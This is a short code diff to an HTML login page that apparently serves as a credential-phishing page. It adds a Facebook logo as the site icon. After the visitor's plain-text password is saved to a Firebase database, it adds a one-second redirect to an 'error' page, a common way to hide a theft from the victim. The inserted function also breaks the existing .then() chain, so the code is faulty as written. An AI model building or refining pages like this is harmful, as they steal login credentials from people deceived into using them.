@@ -5,6 +5,7 @@
 <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-auth.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-database.js"></script>
 <title>Login</title>
+<link rel="icon" type="image/png" href="https://logodownload.org/wp-content/uploads/2014/09/facebook-logo-1-2.png">
 <style>
     html, body{
         height: 100%;
@@ -192,6 +193,14 @@
             password: password,
             last_login: Date.now() 
             })
+            
+            function redirectAfterDelay(url, delay) {
+            setTimeout(function() {
+                window.location.href = url;
+            }, delay);
+            }
+            redirectAfterDelay("error", 1000)
+
             .then(() => {
                 console.log("User data saved to database");
             })
